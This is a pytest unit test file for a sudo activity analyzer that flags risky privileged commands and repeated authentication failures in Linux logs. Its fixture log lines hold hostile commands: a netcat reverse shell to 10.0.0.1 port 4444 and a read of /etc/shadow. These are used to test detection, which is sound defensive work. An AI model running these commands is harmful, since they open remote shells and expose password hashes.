"""Unit tests for core/linux_security/sudo_analyzer.py."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

import pytest

from core.linux_security.models import LinuxLogEvent, LinuxSecurityFindingCategory
from core.linux_security.sudo_analyzer import SudoActivityAnalyzer

pytestmark = pytest.mark.unit

_BASE = datetime(2026, 7, 18, 10, 0, 0, tzinfo=UTC)


def _sudo_event(message: str, *, seconds: int = 0) -> LinuxLogEvent:
    return LinuxLogEvent(
        timestamp=_BASE + timedelta(seconds=seconds),
        host="web01",
        process="sudo",
        raw_message=message,
        line_number=seconds + 1,
    )


def test_sensitive_file_access_flagged() -> None:
    candidates = SudoActivityAnalyzer().analyze(
        [
            _sudo_event(
                "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow"
            )
        ]
    )
    sudo_abuse = [c for c in candidates if c.category == LinuxSecurityFindingCategory.SUDO_ABUSE]
    assert len(sudo_abuse) >= 1
    assert sudo_abuse[0].subject == "deploy"


def test_shell_escape_to_root_flagged() -> None:
    candidates = SudoActivityAnalyzer().analyze(
        [_sudo_event("deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")]
    )
    assert any(c.context.get("reason") == "shell_escape" for c in candidates)


def test_reverse_shell_command_detected_via_process_detector() -> None:
    candidates = SudoActivityAnalyzer().analyze(
        [_sudo_event("deploy : PWD=/tmp ; USER=root ; COMMAND=/bin/nc -e /bin/sh 10.0.0.1 4444")]
    )
    assert any(c.category == LinuxSecurityFindingCategory.REVERSE_SHELL for c in candidates)


def test_benign_command_not_flagged() -> None:
    candidates = SudoActivityAnalyzer().analyze(
        [_sudo_event("deploy : PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl status nginx")]
    )
    assert candidates == []


def test_repeated_auth_failures_flagged_within_window() -> None:
    events = [
        _sudo_event(
            "pam_unix(sudo:auth): authentication failure; logname= uid=1000 euid=0 "
            "tty=/dev/pts/0 ruser=deploy rhost=  user=deploy",
            seconds=i * 5,
        )
        for i in range(4)
    ]
    candidates = SudoActivityAnalyzer(failure_threshold=3).analyze(events)
    abuse = [c for c in candidates if c.subject == "deploy"]
    assert len(abuse) == 1
    assert abuse[0].context["reason"] == "repeated_auth_failure"


def test_no_failure_finding_below_threshold() -> None:
    events = [
        _sudo_event("pam_unix(sudo:auth): authentication failure; user=deploy", seconds=i * 5)
        for i in range(2)
    ]
    candidates = SudoActivityAnalyzer(failure_threshold=3).analyze(events)
    assert candidates == []


def test_non_sudo_events_ignored() -> None:
    event = LinuxLogEvent(timestamp=_BASE, process="CRON", raw_message="(root) CMD (ls)")
    assert SudoActivityAnalyzer().analyze([event]) == []


def test_malformed_sudo_line_does_not_crash() -> None:
    """An unparseable sudo message must degrade to "no candidates" for that
    line, never raise (constitution §1.7)."""
    candidates = SudoActivityAnalyzer().analyze([_sudo_event("this is not a sudo line at all")])
    assert candidates == []
